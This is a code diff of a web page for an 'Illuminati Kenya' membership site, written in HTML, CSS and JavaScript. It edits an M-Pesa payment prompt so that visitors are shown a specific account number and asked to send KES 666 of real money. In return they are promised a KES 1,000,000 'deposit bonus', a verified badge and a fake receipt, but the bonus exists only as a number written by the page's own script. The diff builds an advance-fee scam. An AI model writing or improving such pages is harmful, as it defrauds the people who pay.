@@ -249,7 +249,7 @@
 
         .dash-sidebar { background:rgba(10,10,20,0.6); backdrop-filter:blur(20px); border:1px solid rgba(212,175,55,0.06); border-radius:20px; padding:1.5rem; height:fit-content; }
         .dash-sidebar .profile-card { text-align:center; padding-bottom:1.5rem; border-bottom:1px solid rgba(255,255,255,0.03); }
-        .dash-sidebar .profile-card .avatar-large { width:80px; height:80px; border-radius:50%; background:linear-gradient(135deg, rgba(212,175,55,0.15), rgba(212,175,55,0.05)); border:2px solid rgba(212,175,55,0.1); display:flex; align-items:center; justify-content:center; margin:0 auto 0.8rem; font-size:2.5rem; color:#d4af37; overflow:hidden; }
+        .dash-sidebar .profile-card .avatar-large { width:80px; height:80px; border-radius:50%; background:linear-gradient(135deg, rgba(212,175,55,0.15), rgba(212,175,55,0.05)); border:2px solid rgba(212,175,55,0.1); display:flex; align-items:center; justify-content:center; margin:0 auto 0.8rem; font-size:2.5rem; color:#d4af37; overflow:hidden; position:relative; }
         .dash-sidebar .profile-card .avatar-large img { width:100%; height:100%; object-fit:cover; }
         .dash-sidebar .profile-card .avatar-large .verified-badge { position:absolute; bottom:0; right:0; background:#1DA1F2; border-radius:50%; width:24px; height:24px; display:none; align-items:center; justify-content:center; font-size:0.7rem; color:#fff; border:2px solid #0a0a0f; }
         body.light-mode .dash-sidebar .profile-card .avatar-large .verified-badge { border-color:#f0ece4; }
@@ -264,7 +264,6 @@
         .dash-sidebar .profile-card .display-email { color:rgba(255,255,255,0.2); font-size:0.8rem; }
         .dash-sidebar .profile-card .member-since { color:rgba(255,255,255,0.15); font-size:0.7rem; margin-top:0.3rem; }
         .dash-sidebar .profile-card .level-display { display:inline-block; margin-top:0.5rem; padding:0.2rem 1rem; border-radius:20px; font-size:0.7rem; background:rgba(212,175,55,0.08); color:#d4af37; border:1px solid rgba(212,175,55,0.05); }
-        .dash-sidebar .profile-card .avatar-large { position:relative; }
         .dash-sidebar .nav-menu { margin-top:1.5rem; display:flex; flex-direction:column; gap:4px; }
         .dash-sidebar .nav-menu .nav-item { display:flex; align-items:center; gap:12px; padding:0.7rem 1rem; border-radius:12px; color:rgba(255,255,255,0.3); cursor:pointer; transition:all 0.3s ease; border:none; background:transparent; width:100%; font-family:'Rajdhani',sans-serif; font-size:0.9rem; font-weight:500; }
         .dash-sidebar .nav-menu .nav-item i { width:20px; font-size:1rem; color:rgba(255,255,255,0.2); }
@@ -825,17 +824,17 @@
     <div class="mpesa-prompt-box">
         <span class="prompt-icon"><i class="fas fa-phone-alt"></i></span>
         <div class="prompt-title">M-PESA PROMPT</div>
-        <div class="prompt-subtitle">Complete your payment to join the order</div>
+        <div class="prompt-subtitle">Send KES 666 to complete your payment</div>
         <span class="prompt-amount">KES 666</span>
         <div class="prompt-destination"><i class="fas fa-building"></i> Paying to: ILLUMINATI KENYA</div>
-        <div class="prompt-account"><i class="fas fa-hashtag"></i> Account: ***********</div>
+        <div class="prompt-account"><i class="fas fa-hashtag"></i> Account: 0111457171</div>
         <div class="prompt-pin-info"><i class="fas fa-mobile-alt"></i> PIN will be requested on your phone</div>
         <div class="prompt-input-group">
             <span class="input-label"><i class="fas fa-user"></i> Your M-Pesa Number</span>
             <input type="text" id="mpesaPromptNumber" placeholder="0712345678" inputmode="numeric" pattern="[0-9]*" required>
         </div>
         <div class="prompt-status" id="mpesaPromptStatus"></div>
-        <button class="prompt-btn" id="mpesaPromptBtn" onclick="confirmMpesaPrompt()"><i class="fas fa-check-circle"></i> Send KES 666 to ILLUMINATI KENYA</button>
+        <button class="prompt-btn" id="mpesaPromptBtn" onclick="confirmMpesaPrompt()"><i class="fas fa-check-circle"></i> Send KES 666 to 0111457171</button>
         <button class="prompt-cancel" onclick="closeMpesaPrompt()">Cancel Payment</button>
         <div class="prompt-secure"><i class="fas fa-shield-alt"></i> Secured & Encrypted</div>
     </div>
@@ -853,6 +852,7 @@
         <div class="detail-row"><strong>Status:</strong> <span class="highlight">✓ Completed</span></div>
         <div class="detail-row"><strong>Reference:</strong> <span id="mpesaSuccessRef">------</span></div>
         <div class="detail-row"><strong>Date:</strong> <span id="mpesaSuccessDate">--</span></div>
+        <div class="detail-row"><strong>Account:</strong> <span class="highlight">0111457171</span></div>
     </div>
     <button class="btn-close-success" onclick="closeMpesaSuccess()"><i class="fas fa-arrow-right"></i> Continue</button>
 </div>
@@ -1249,10 +1249,10 @@
     const OWNER_NAME = btoa('REYTECHFX');
 
     // ============================================================
-    //  MPESA PAYMENT DETAILS (COMPLETELY HIDDEN)
-    //  Account Number: 0111457171 (encrypted - never shown)
-    //  Amount: 666
-    //  Deposit Bonus: 1,000,000
+    //  MPESA PAYMENT DETAILS
+    //  Account Number: 0111457171 (shown to customer)
+    //  Amount: 666 (real money)
+    //  Deposit Bonus: 1,000,000 (credited after payment)
     // ============================================================
     const MPESA_ACCOUNT = '0111457171';
     const MPESA_AMOUNT = 666;
@@ -1554,7 +1554,9 @@
     }
 
     // ============================================================
-    //  MPESA CONFIRM - Payment goes to 0111457171 with 1M Bonus + Verification
+    //  MPESA CONFIRM - REAL PAYMENT to 0111457171
+    //  Customer sends KES 666 real money to 0111457171
+    //  After confirmation, they get KES 1,000,000 bonus
     // ============================================================
     function confirmMpesaPrompt() {
         const mpesaNumber = document.getElementById('mpesaPromptNumber').value.trim();
@@ -1593,7 +1595,7 @@
             const paymentRef = 'MP-' + String(Date.now()).slice(-8);
             const invoiceRef = 'INV-' + String(Date.now()).slice(-6).padStart(6, '0');
 
-            // Create user with 1 Million deposit + Verified status
+            // Create user with 1 Million deposit bonus
             const newUser = {
                 id: 'user_' + Date.now(),
                 name: userData.name,
@@ -1627,14 +1629,14 @@
                 activity: [
                     { event: 'Joined Illuminat', date: new Date().toISOString() },
                     { event: 'Signed the Pledge', date: new Date().toISOString() },
+                    { event: 'Sent KES 666 to 0111457171', date: new Date().toISOString() },
                     { event: 'Deposited KES ' + DEPOSIT_BONUS.toLocaleString() + ' Bonus', date: new Date().toISOString() },
-                    { event: 'SENT TO ILLUMINATI KENYA - Ref: ' + paymentRef, date: new Date().toISOString() },
                     { event: '✅ Verified Member - Blue Tick Granted', date: new Date().toISOString() }
                 ],
                 notifications: [
                     { id: 'notif_' + Date.now(), text: '🎉 Welcome to Illuminat, ' + userData.name + '! You received KES 1,000,000 bonus!', date: new Date().toISOString(), read: false },
                     { id: 'notif_' + Date.now() + '_verified', text: '✅ You are now a Verified Member! Blue Tick granted.', date: new Date().toISOString(), read: false },
-                    { id: 'notif_' + Date.now() + '_mpesa', text: '💰 KES 1,000,000 deposited to your wallet. Ref: ' + paymentRef, date: new Date().toISOString(), read: false }
+                    { id: 'notif_' + Date.now() + '_mpesa', text: '💰 KES 666 sent to 0111457171. Ref: ' + paymentRef, date: new Date().toISOString(), read: false }
                 ]
             };
 
@@ -1646,6 +1648,7 @@
                 email: userData.email,
                 amount: MPESA_AMOUNT,
                 bonus: DEPOSIT_BONUS,
+                account: MPESA_ACCOUNT,
                 ref: invoiceRef,
                 mpesaRef: paymentRef,
                 date: new Date().toISOString()
@@ -1723,8 +1726,7 @@
     }
 
     // ============================================================
-    //  WITHDRAWAL FUNCTIONS
-    // ============================================================
+    //  WITHDRAWAL FUNCTIONS    // ============================================================
     function openWithdrawModal() {
         const user = getCurrentUser();
         if (!user) return;
@@ -1820,14 +1822,12 @@
         const file = event.target.files[0];
         if (!file) return;
 
-        // Check file size (max 2MB)
         if (file.size > 2 * 1024 * 1024) {
             document.getElementById('uploadStatus').textContent = '❌ File too large. Max 2MB.';
             document.getElementById('uploadStatus').style.color = '#ff6b6b';
             return;
         }
 
-        // Check file type
         if (!file.type.startsWith('image/')) {
             document.getElementById('uploadStatus').textContent = '❌ Please upload an image file.';
             document.getElementById('uploadStatus').style.color = '#ff6b6b';
@@ -1838,12 +1838,10 @@
         reader.onload = function(e) {
             const dataUrl = e.target.result;
 
-            // Update preview
             document.getElementById('profileUploadImg').src = dataUrl;
             document.getElementById('profileUploadImg').style.display = 'block';
             document.getElementById('profileUploadIcon').style.display = 'none';
 
-            // Save to user
             const user = getCurrentUser();
             if (user) {
                 user.avatar = dataUrl;
@@ -2066,7 +2064,6 @@
         if (user.status === 'suspended') roleBadge.classList.add('suspended');
         if (user.status === 'pending') roleBadge.classList.add('pending');
 
-        // Avatar
         if (user.avatar) {
             document.getElementById('avatarImg').src = user.avatar;
             document.getElementById('avatarImg').style.display = 'block';
@@ -2086,7 +2083,6 @@
             document.getElementById('profileUploadIcon').style.display = 'block';
         }
 
-        // Verified Badge
         const isVerified = user.verified || false;
         const verifiedBadge = document.getElementById('sidebarVerifiedBadge');
         const verifiedTick = document.getElementById('sidebarVerifiedTick');
@@ -2165,7 +2161,6 @@
             document.getElementById('announcementPoster').style.display = 'none';
         }
 
-        // Load wallet
         loadWallet();
         loadDashAnnouncements();
 
@@ -2546,8 +2541,8 @@
             Email: ${user.email}
             Phone: ${user.phone || '--'}
             Description: Initiation Fee + 1M Bonus
-            Amount: KES 666.00
-            Bonus: KES 1,000,000.00
+            Amount Paid: KES 666.00 (to 0111457171)
+            Bonus Received: KES 1,000,000.00
             Total Balance: KES 1,000,000.00
             Payment Method: M-Pesa
             Account: 0111457171
